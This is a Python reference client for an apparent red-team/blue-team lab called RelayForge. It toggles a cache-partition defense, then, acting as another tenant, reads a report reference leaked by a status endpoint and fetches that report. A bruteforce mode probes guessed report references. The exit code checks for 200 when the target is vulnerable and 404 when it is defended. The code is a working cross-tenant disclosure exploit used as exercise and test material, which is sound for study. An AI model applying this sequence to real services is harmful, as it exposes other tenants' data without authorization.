#!/usr/bin/env python3
"""Deterministic RF-B staged report-cache reference client."""

from __future__ import annotations

import argparse
import json
import urllib.error
import urllib.request
from typing import Any, Mapping

DEFAULT_TENANT = "tenant-red"
BLUE_HEADERS = {"x-relayforge-team": "blue"}


def _request(
    *,
    method: str,
    url: str,
    value: Mapping[str, Any] | None = None,
    headers: Mapping[str, str] | None = None,
) -> tuple[int, dict[str, Any]]:
    body = None
    request_headers = dict(headers or {})
    if value is not None:
        body = json.dumps(
            dict(value), sort_keys=True, separators=(",", ":")
        ).encode("utf-8")
        request_headers["content-type"] = "application/json"
    request = urllib.request.Request(
        url, data=body, headers=request_headers, method=method
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            payload = json.loads(response.read().decode("utf-8"))
            return int(response.status), payload
    except urllib.error.HTTPError as exc:
        payload = json.loads(exc.read().decode("utf-8"))
        return int(exc.code), payload


def run_sequence(
    *,
    base_url: str,
    tenant_id: str = DEFAULT_TENANT,
    defense_enabled: bool = False,
) -> dict[str, Any]:
    """Run OBS-20 -> OBS-21 -> report lookup through the public gateway."""

    defense_status, defense = _request(
        method="POST",
        url=f"{base_url}/api/v1/defenses/cache-principal-partition",
        value={"enabled": defense_enabled},
        headers=BLUE_HEADERS,
    )
    tenant_headers = {"x-relayforge-tenant": tenant_id}
    owned_status, owned = _request(
        method="GET",
        url=f"{base_url}/api/v1/reports/owned",
        headers=tenant_headers,
    )
    recent_status, recent = _request(
        method="GET",
        url=f"{base_url}/api/v1/status/recent",
        headers=tenant_headers,
    )
    reference = str(recent.get("opaque_report_reference") or "")
    disclosure_status, disclosure = _request(
        method="GET",
        url=f"{base_url}/api/v1/reports/{reference}",
        headers=tenant_headers,
    )
    return {
        "schema": "battle.v16.relayforge.rf_b_reference_client.v1",
        "mode": "DEFENDED" if defense_enabled else "VULNERABLE",
        "defense_status": defense_status,
        "defense": defense,
        "owned_status": owned_status,
        "owned": owned,
        "recent_status": recent_status,
        "recent": recent,
        "disclosure_status": disclosure_status,
        "disclosure": disclosure,
    }


def run_bruteforce_probe(
    *, base_url: str, tenant_id: str = DEFAULT_TENANT, reference: str
) -> dict[str, Any]:
    status, payload = _request(
        method="GET",
        url=f"{base_url}/api/v1/reports/{reference}",
        headers={"x-relayforge-tenant": tenant_id},
    )
    return {
        "schema": "battle.v16.relayforge.rf_b_bruteforce_client.v1",
        "http_status": status,
        "response": payload,
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--tenant-id", default=DEFAULT_TENANT)
    parser.add_argument("--mode", choices=("vulnerable", "defended", "bruteforce"), default="vulnerable")
    parser.add_argument("--reference", default="0" * 64)
    args = parser.parse_args()

    if args.mode == "bruteforce":
        result = run_bruteforce_probe(
            base_url=args.base_url,
            tenant_id=args.tenant_id,
            reference=args.reference,
        )
        print(json.dumps(result, indent=2, sort_keys=True))
        return 0 if result["http_status"] == 404 else 1

    result = run_sequence(
        base_url=args.base_url,
        tenant_id=args.tenant_id,
        defense_enabled=args.mode == "defended",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    expected = 404 if args.mode == "defended" else 200
    return 0 if result["disclosure_status"] == expected else 1


if __name__ == "__main__":
    raise SystemExit(main())
